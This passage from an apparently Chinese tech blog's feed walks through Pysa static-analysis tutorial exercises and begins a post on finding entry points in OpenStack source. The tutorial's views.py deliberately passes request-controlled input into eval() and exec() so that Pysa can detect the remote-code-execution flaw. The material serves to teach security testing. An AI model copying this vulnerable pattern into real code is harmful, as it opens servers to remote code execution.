class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pyre analyze --no-verify --save-results-to .</span><br><span class="line">sapp analyze taint-output.json</span><br><span class="line">sapp explore</span><br></pre></td></tr></table></figure><p>可以看到新的特征，使用两个特征过滤，返回 0 个安全问题。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">[ run 2 ]</span><br><span class="line">&gt;&gt;&gt; issues</span><br><span class="line">Issue 3</span><br><span class="line">            Code: 5001</span><br><span class="line">         Message: Data from [UserControlled] <span class="built_in">source</span>(s) may reach [RemoteCodeExecution] sink(s)</span><br><span class="line">        Callable: views.do_or</span><br><span class="line">         Sources: UserControlled</span><br><span class="line">           Sinks: RemoteCodeExecution</span><br><span class="line">        Features: always-via:format-string</span><br><span class="line">                  first-index:left</span><br><span class="line">                  always-via:assert_numeric  <span class="comment"># 新特征</span></span><br><span class="line">                  first-index:right</span><br><span class="line">                  has:first-index</span><br><span class="line">        Location: views.py:33|18|38</span><br><span class="line">Min Trace Length: Source (0) | Sink (0)</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">Issue 4</span><br><span class="line">            Code: 5001</span><br><span class="line">         Message: Data from [UserControlled] <span class="built_in">source</span>(s) may reach [RemoteCodeExecution] sink(s)</span><br><span class="line">        Callable: views.do_and</span><br><span class="line">         Sources: UserControlled</span><br><span class="line">           Sinks: RemoteCodeExecution</span><br><span class="line">        Features: always-via:format-string</span><br><span class="line">                  always-via:obscure</span><br><span class="line">                  first-index:left</span><br><span class="line">                  always-type:scalar</span><br><span class="line">                  first-index:right</span><br><span class="line">                  has:first-index</span><br><span class="line">                  always-type:bool</span><br><span class="line">        Location: views.py:21|18|39</span><br><span class="line">Min Trace Length: Source (0) | Sink (0)</span><br><span class="line">Found 2 issues with run_id 2.</span><br><span class="line"></span><br><span class="line">[ run 2 ]</span><br><span class="line">&gt;&gt;&gt; issues(exclude_features=[<span class="string">&quot;always-type:bool&quot;</span>]) <span class="comment"># 过滤 do_and</span></span><br><span class="line">Issue 3</span><br><span class="line">            Code: 5001</span><br><span class="line">         Message: Data from [UserControlled] <span class="built_in">source</span>(s) may reach [RemoteCodeExecution] sink(s)</span><br><span class="line">        Callable: views.do_or</span><br><span class="line">         Sources: UserControlled</span><br><span class="line">           Sinks: RemoteCodeExecution</span><br><span class="line">        Features: always-via:format-string</span><br><span class="line">                  first-index:left</span><br><span class="line">                  always-via:assert_numeric</span><br><span class="line">                  first-index:right</span><br><span class="line">                  has:first-index</span><br><span class="line">        Location: views.py:33|18|38</span><br><span class="line">Min Trace Length: Source (0) | Sink (0)</span><br><span class="line">Found 1 issues with run_id 2.</span><br><span class="line"></span><br><span class="line">[ run 2 ]</span><br><span class="line">&gt;&gt;&gt; issues(exclude_features=[<span class="string">&quot;always-type:bool&quot;</span>, <span class="string">&quot;always-via:assert_numeric&quot;</span>]) <span class="comment"># 过滤 do_and、do_or</span></span><br><span class="line"></span><br><span class="line">Found 0 issues with run_id 2.</span><br><span class="line"></span><br><span class="line">[ run 2 ]</span><br><span class="line">&gt;&gt;&gt; <span class="built_in">exit</span></span><br><span class="line">(tutorial) jck@analysis:~/pyre-check/documentation/pysa_tutorial/exercise4$</span><br></pre></td></tr></table></figure><h2 id="exercise5"><a href="#exercise5" class="headerlink" title="exercise5"></a>exercise5</h2><p>动态模型生成器在 Pysa 之前运行，能够生成 <code>.pysa</code> 文件。官方仓库 <a href="https://github.com/facebook/pyre-check/tree/master/tools/generate_taint_models">pyre-check/tools/generate_taint_models/get_*.py</a> 中包含了生成器，说明文档见 <a href="https://pyre-check.org/docs/pysa-model-generators/">Dynamically Generating Models</a>。</p><p>直接运行 <code>pyre analyze --no-verify</code> 没有检测出安全问题。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">ƛ No cached overrides loaded, computing overrides...</span><br><span class="line">ƛ `google.protobuf.message.Message.ClearField` has 57 overrides, this might slow down the analysis considerably.</span><br><span class="line">ƛ `google.protobuf.message.Message.__init__` has 58 overrides, this might slow down the analysis considerably.</span><br><span class="line">ƛ Iteration <span class="comment">#2. 4 Callables [zipfile.ZipFile::__init__ (override), str::format (override), shelve.Shelf::__init__ (overri[]</span></span><br></pre></td></tr></table></figure><p>views.py 和 urls.py 模仿 Django 处理请求的逻辑。views.py 两个函数都存在 RCE 漏洞，但 Pysa 产生了漏报。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> Callable</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">api_wrapper</span>(<span class="params">func: Callable</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">inner</span>(<span class="params">request</span>):</span></span><br><span class="line">        func(request, **request.GET)</span><br><span class="line">    <span class="keyword">return</span> inner</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">operate_on_twos</span>(<span class="params">request, operator: <span class="built_in">str</span></span>):</span></span><br><span class="line">    result = <span class="built_in">eval</span>(<span class="string">f&quot;2 <span class="subst">&#123;operator&#125;</span> 2&quot;</span>)  <span class="comment"># noqa: P204</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="meta">@api_wrapper</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">operate_on_threes</span>(<span class="params">request, operator: <span class="built_in">str</span></span>):</span></span><br><span class="line">    exec(<span class="string">f&quot;result = 3 <span class="subst">&#123;operator&#125;</span> 3&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> result  <span class="comment"># noqa: F821</span></span><br></pre></td></tr></table></figure><p>urls.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> dataclasses <span class="keyword">import</span> dataclass</span><br><span class="line"><span class="keyword">from</span> views <span class="keyword">import</span> operate_on_twos</span><br><span class="line"></span><br><span class="line"><span class="meta">@dataclass</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UrlPattern</span>:</span></span><br><span class="line">    path: <span class="built_in">str</span></span><br><span class="line">    callback: <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line">urlpatterns = [UrlPattern(<span class="string">r&quot;^operate_on_twos/(.*)&quot;</span>, operate_on_twos)]</span><br></pre></td></tr></table></figure><p>generate_models.py 能够为 views.py 动态生成污点注释。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> importlib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">from</span> urls <span class="keyword">import</span> UrlPattern</span><br><span class="line"></span><br><span class="line"><span class="comment"># Make sure we&#x27;re able to import dependencies in &#x27;pyre-check&#x27; repo, since they</span></span><br><span class="line"><span class="comment"># are not currently in the PyPI package for pyre-check</span></span><br><span class="line">current_file = Path(__file__).absolute()</span><br><span class="line">sys.path.append(<span class="built_in">str</span>(current_file.parents[<span class="number">4</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Work around &#x27;-&#x27; in the name of &#x27;pyre-check&#x27;</span></span><br><span class="line">generate_taint_models = importlib.import_module(</span><br><span class="line">    <span class="string">&quot;pyre-check.tools.generate_taint_models&quot;</span></span><br><span class="line">)</span><br><span class="line">view_generator = importlib.import_module(</span><br><span class="line">    <span class="string">&quot;pyre-check.tools.generate_taint_models.view_generator&quot;</span></span><br><span class="line">)</span><br><span class="line">generator_specifications = importlib.import_module(</span><br><span class="line">    <span class="string">&quot;pyre-check.tools.generate_taint_models.generator_specifications&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ignore</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>() -&gt; <span class="keyword">None</span>:</span></span><br><span class="line">    <span class="comment"># Here, specify all the generators that you might want to call.</span></span><br><span class="line">    generators = &#123;</span><br><span class="line">        <span class="string">&quot;django_path_params&quot;</span>: generate_taint_models.RESTApiSourceGenerator(</span><br><span class="line">            django_urls=view_generator.DjangoUrls(</span><br><span class="line">                urls_module=<span class="string">&quot;urls&quot;</span>,</span><br><span class="line">                url_pattern_type=UrlPattern,</span><br><span class="line">                url_resolver_type=Ignore,</span><br><span class="line">            )</span><br><span class="line">        ),</span><br><span class="line">        <span class="comment"># &quot;decorator_extracted_params&quot;: generate_taint_models.&lt;GENERATOR_NAME&gt;(</span></span><br><span class="line">        <span class="comment">#     root=&quot;.&quot;,</span></span><br><span class="line">        <span class="comment">#     annotation_specifications=[</span></span><br><span class="line">        <span class="comment">#         generate_taint_models.DecoratorAnnotationSpecification(</span></span><br><span class="line">        <span class="comment">#             decorator=&lt;DECORATOR_NAME_INCLUDING_PRECEEDING_@&gt;,</span></span><br><span class="line">        <span class="comment">#             annotations=generator_specifications.default_entrypoint_taint,</span></span><br><span class="line">        <span class="comment">#         )</span></span><br><span class="line">        <span class="comment">#     ],</span></span><br><span class="line">        <span class="comment"># ),</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># The `run_generators` function will take care of parsing command-line arguments, as</span></span><br><span class="line">    <span class="comment"># well as executing the generators specified in `default_modes` unless you pass in a</span></span><br><span class="line">    <span class="comment"># specific set from the command line.</span></span><br><span class="line">    generate_taint_models.run_generators(</span><br><span class="line">        generators,</span><br><span class="line">        default_modes=[</span><br><span class="line">            <span class="string">&quot;django_path_params&quot;</span>,</span><br><span class="line">            <span class="comment"># &quot;decorator_extracted_params&quot;</span></span><br><span class="line">        ],</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>利用 generate_models.py 动态生成 <code>.pysa</code> 文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python generate_models.py --output-directory .</span><br></pre></td></tr></table></figure><div class="note danger flat"><p>报错 graphql3 模块没有找到，将文件中的 <code>graphql3</code> 改为 <code>graphql</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim /home/jck/pyre-check/tools/generate_taint_models/get_dynamic_graphql_sources.py</span><br><span class="line"><span class="comment"># from graphql import GraphQLSchema</span></span><br></pre></td></tr></table></figure></div><p>重新执行成功，输出如下，生成 generated_django_path_params.pysa 配置文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(tutorial) jck@analysis:~/pyre-check/documentation/pysa_tutorial/exercise5$ python generate_models.py --output-directory .</span><br><span class="line">2021-07-07 03:24:56 INFO Computing models <span class="keyword">for</span> `django_path_params`</span><br><span class="line">2021-07-07 03:24:56 INFO Getting all URLs from `urls`</span><br><span class="line">2021-07-07 03:24:56 INFO Computed models <span class="keyword">for</span> `django_path_params` <span class="keyword">in</span> 0.000 seconds.</span><br><span class="line">&#123;<span class="string">&quot;number of generated models&quot;</span>: 1&#125;</span><br></pre></td></tr></table></figure><p>generated_django_path_params.pysa 中指明了使用污点源点和汇点的函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def views.operate_on_twos(request: TaintSource[UserControlled], operator: TaintSource[UserControlled]) -&gt; TaintSink[ReturnedToUser]: ...</span><br></pre></td></tr></table></figure><p>再次执行 <code>pyre analyze --no-verify</code>，得到 1 个安全问题，还有一个问题仍然漏报。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">ƛ No cached overrides loaded, computing overrides...</span><br><span class="line">ƛ `google.protobuf.message.Message.ClearField` has 57 overrides, this might slow down the analysis considerably.</span><br><span class="line">ƛ `google.protobuf.message.Message.__init__` has 58 overrides, this might slow down the analysis considerably.</span><br><span class="line">ƛ Iteration <span class="comment">#2. 4 Callables [zipfile.ZipFile::__init__ (override), str::format (override), shelve.Shelf::__init__ (overri[</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;line&quot;</span>: 17,</span><br><span class="line">    <span class="string">&quot;column&quot;</span>: 18,</span><br><span class="line">    <span class="string">&quot;stop_line&quot;</span>: 17,</span><br><span class="line">    <span class="string">&quot;stop_column&quot;</span>: 35,</span><br><span class="line">    <span class="string">&quot;path&quot;</span>: <span class="string">&quot;views.py&quot;</span>,</span><br><span class="line">    <span class="string">&quot;code&quot;</span>: 5001,</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Possible shell injection&quot;</span>,</span><br><span class="line">    <span class="string">&quot;description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible shell injection [5001]: Data from [UserControlled] source(s) may reach [RemoteCodeExecution] sink(s)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;long_description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible shell injection [5001]: Data from [UserControlled] source(s) may reach [RemoteCodeExecution] sink(s)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;concise_description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible shell injection [5001]: Data from [UserControlled] source(s) may reach [RemoteCodeExecution] sink(s)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;inference&quot;</span>: null,</span><br><span class="line">    <span class="string">&quot;define&quot;</span>: <span class="string">&quot;views.operate_on_twos&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>扩展 generate_models.py 识别装饰器，使用注释的内容，只需要填入两项（生成器可以在 <a href="https://pyre-check.org/docs/pysa-model-generators/#example-model-generators">Example Model Generators</a> 里找）：</p><ul><li><code>&lt;GENERATOR_NAME&gt;</code>：<code>AnnotatedFreeFunctionWithDecoratorGenerator</code></li><li><code>&lt;DECORATOR_NAME_INCLUDING_PRECEEDING_@&gt;</code>：<code>&quot;@api_wrapper&quot;</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>() -&gt; <span class="keyword">None</span>:</span></span><br><span class="line">    <span class="comment"># Here, specify all the generators that you might want to call.</span></span><br><span class="line">    generators = &#123;</span><br><span class="line">        <span class="string">&quot;django_path_params&quot;</span>: generate_taint_models.RESTApiSourceGenerator(</span><br><span class="line">            django_urls=view_generator.DjangoUrls(</span><br><span class="line">                urls_module=<span class="string">&quot;urls&quot;</span>,</span><br><span class="line">                url_pattern_type=UrlPattern,</span><br><span class="line">                url_resolver_type=Ignore,</span><br><span class="line">            )</span><br><span class="line">        ),</span><br><span class="line">        <span class="string">&quot;decorator_extracted_params&quot;</span>: generate_taint_models.AnnotatedFreeFunctionWithDecoratorGenerator(</span><br><span class="line">            root=<span class="string">&quot;.&quot;</span>,</span><br><span class="line">            annotation_specifications=[</span><br><span class="line">                generate_taint_models.DecoratorAnnotationSpecification(</span><br><span class="line">                    decorator=<span class="string">&quot;@api_wrapper&quot;</span>,</span><br><span class="line">                    annotations=generator_specifications.default_entrypoint_taint,</span><br><span class="line">                )</span><br><span class="line">            ],</span><br><span class="line">        ),</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># The `run_generators` function will take care of parsing command-line arguments, as</span></span><br><span class="line">    <span class="comment"># well as executing the generators specified in `default_modes` unless you pass in a</span></span><br><span class="line">    <span class="comment"># specific set from the command line.</span></span><br><span class="line">    generate_taint_models.run_generators(</span><br><span class="line">        generators,</span><br><span class="line">        default_modes=[</span><br><span class="line">            <span class="string">&quot;django_path_params&quot;</span>,</span><br><span class="line">            <span class="string">&quot;decorator_extracted_params&quot;</span></span><br><span class="line">        ],</span><br><span class="line">    )</span><br></pre></td></tr></table></figure><p>重新生成 <code>.pysa</code> 文件并执行分析：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python generate_models.py --output-directory .</span><br><span class="line">pyre analyze --no-verify</span><br></pre></td></tr></table></figure><p>检测出 2 个安全问题：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">ƛ No cached overrides loaded, computing overrides...</span><br><span class="line">ƛ `google.protobuf.message.Message.ClearField` has 57 overrides, this might slow down the analysis considerably.</span><br><span class="line">ƛ `google.protobuf.message.Message.__init__` has 58 overrides, this might slow down the analysis considerably.</span><br><span class="line">ƛ Iteration <span class="comment">#2. 4 Callables [zipfile.ZipFile::__init__ (override), str::format (override), shelve.Shelf::__init__ (overri[</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;line&quot;</span>: 25,</span><br><span class="line">    <span class="string">&quot;column&quot;</span>: 9,</span><br><span class="line">    <span class="string">&quot;stop_line&quot;</span>: 25,</span><br><span class="line">    <span class="string">&quot;stop_column&quot;</span>: 35,</span><br><span class="line">    <span class="string">&quot;path&quot;</span>: <span class="string">&quot;views.py&quot;</span>,</span><br><span class="line">    <span class="string">&quot;code&quot;</span>: 5001,</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Possible shell injection&quot;</span>,</span><br><span class="line">    <span class="string">&quot;description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible shell injection [5001]: Data from [UserControlled] source(s) may reach [RemoteCodeExecution] sink(s)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;long_description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible shell injection [5001]: Data from [UserControlled] source(s) may reach [RemoteCodeExecution] sink(s)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;concise_description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible shell injection [5001]: Data from [UserControlled] source(s) may reach [RemoteCodeExecution] sink(s)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;inference&quot;</span>: null,</span><br><span class="line">    <span class="string">&quot;define&quot;</span>: <span class="string">&quot;views.operate_on_threes&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;line&quot;</span>: 17,</span><br><span class="line">    <span class="string">&quot;column&quot;</span>: 18,</span><br><span class="line">    <span class="string">&quot;stop_line&quot;</span>: 17,</span><br><span class="line">    <span class="string">&quot;stop_column&quot;</span>: 35,</span><br><span class="line">    <span class="string">&quot;path&quot;</span>: <span class="string">&quot;views.py&quot;</span>,</span><br><span class="line">    <span class="string">&quot;code&quot;</span>: 5001,</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Possible shell injection&quot;</span>,</span><br><span class="line">    <span class="string">&quot;description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible shell injection [5001]: Data from [UserControlled] source(s) may reach [RemoteCodeExecution] sink(s)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;long_description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible shell injection [5001]: Data from [UserControlled] source(s) may reach [RemoteCodeExecution] sink(s)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;concise_description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible shell injection [5001]: Data from [UserControlled] source(s) may reach [RemoteCodeExecution] sink(s)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;inference&quot;</span>: null,</span><br><span class="line">    <span class="string">&quot;define&quot;</span>: <span class="string">&quot;views.operate_on_twos&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h1 id="参阅"><a href="#参阅" class="headerlink" title="参阅"></a>参阅</h1><ul><li><a href="https://engineering.fb.com/2020/08/07/security/pysa/">Pysa: An open source static analysis tool to detect and prevent security issues in Python code</a></li><li><a href="https://github.com/facebook/pyre-check/tree/master/documentation/pysa_tutorial">Pysa Tutorial</a></li><li><a href="https://pyre-check.org/docs/pysa-basics">Pysa QuickStart guide</a></li><li><a href="https://developers.facebook.com/blog/post/2021/04/29/eli5-pysa-security-focused-analysis-tool-python">ELI5: Pysa - A Security-Focused Static Analysis Tool for Python Code</a></li><li><a href="https://www.youtube.com/watch?v=8I3zlvtpOww">Workshop: Graham Bleaney - Pysa to Identify Python Vulnerabilities - DEF CON 28SM AppSec Village</a></li></ul>]]></content>
    
    
    <summary type="html">做了做官方提供的 5 个练习教程</summary>
    
    
    
    <category term="Security" scheme="https://jckling.github.io/categories/Security/"/>
    
    
    <category term="Python" scheme="https://jckling.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>OpenStack 组件源码阅读</title>
    <link href="https://jckling.github.io/2021/07/02/OpenStack/OpenStack%20%E7%BB%84%E4%BB%B6%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/"/>
    <id>https://jckling.github.io/2021/07/02/OpenStack/OpenStack%20%E7%BB%84%E4%BB%B6%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/</id>
    <published>2021-07-02T12:22:24.000Z</published>
    <updated>2021-11-23T14:04:58.781Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这段时间都在读 OpenStack 组件源码，主要依赖官方文档和《OpenStack 设计与实现》，目前这部分的工作告一段落，稍微整理一下阅读源码的方法，主要是如何找到程序的入口。</p><p>Kolla-Ansible 搭建环境使用的是 Victoria 版本的源码，主要包含以下几个组件：</p><ul><li>Keystone</li><li>Glance</li><li>Nova</li><li>Neutron</li><li>Heat</li></ul><h1 id="源码阅读"><a href="#源码阅读" class="headerlink" title="源码阅读"></a>源码阅读</h1><p>实际上，程序的入口从 setup.cfg 文件就可以看出来了，如何处理请求会涉及到 paste.ini 配置文件。有些组件比较复杂（比如 nova、neutron），组件本身包含多个子组件，有 wsgi 应用、OS-Ken 应用等，启动方式也并不统一，因此需要深入源码才能找到真正的启动位置和启动方式。</p><p>此外，组件不仅有对外提供的 RESTful API 接口，组件内部和组件之间还有 RPC 调用，会涉及消息队列（一般是 rabbitmq）和 socket 通信，而这也是需要深入源码才能理清的。</p><h2 id="setup-cfg"><a href="#setup-cfg" class="headerlink" title="setup.cfg"></a>setup.cfg</h2><p>上述 OpenStack 组件都包含 setup.cfg 文件，<a href="https://setuptools.readthedocs.io/en/latest/index.html">Setuptools</a> 工具使用该配置文件设置包的元数据和其他选项，具体的配置项可以在 <a href="https://setuptools.readthedocs.io/en/latest/userguide/declarative_config.html#configuring-setup-using-setup-cfg-files">文档</a> 中查阅。</p><p>这里主要关注的是 <code>entry_points</code> 小节，可以找到代码的入口点，组件启动的方式包括 <code>console_scripts</code> 和 <code>wsgi_scripts</code> ，分别表示命令行脚本和 wsgi 脚本，通常 wsgi 脚本通过 Apache + mod_wsgi 调用。</p><p>以 glance 为例，glance-api 可以使用命令行脚本启动也可以使用 wsgi 脚本启动，不过官方建议在生产环境中使用命令行脚本启动。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[entry_points]</span><br><span class="line">console_scripts &#x3D;</span><br><span class="line">    glance-api &#x3D; glance.cmd.api:main</span><br><span class="line">    glance-cache-prefetcher &#x3D; glance.cmd.cache_prefetcher:main</span><br><span class="line">    glance-cache-pruner &#x3D; glance.cmd.cache_pruner:main</span><br><span class="line">    glance-cache-manage &#x3D; glance.cmd.cache_manage:main</span><br><span class="line">    glance-cache-cleaner &#x3D; glance.cmd.cache_cleaner:main</span><br><span class="line">    glance-control &#x3D; glance.cmd.control:main</span><br><span class="line">    glance-manage &#x3D; glance.cmd.manage:main</span><br><span class="line">    glance-replicator &#x3D; glance.cmd.replicator:main</span><br><span class="line">    glance-scrubber &#x3D; glance.cmd.scrubber:main</span><br><span class="line">    glance-status &#x3D; glance.cmd.status:main</span><br><span 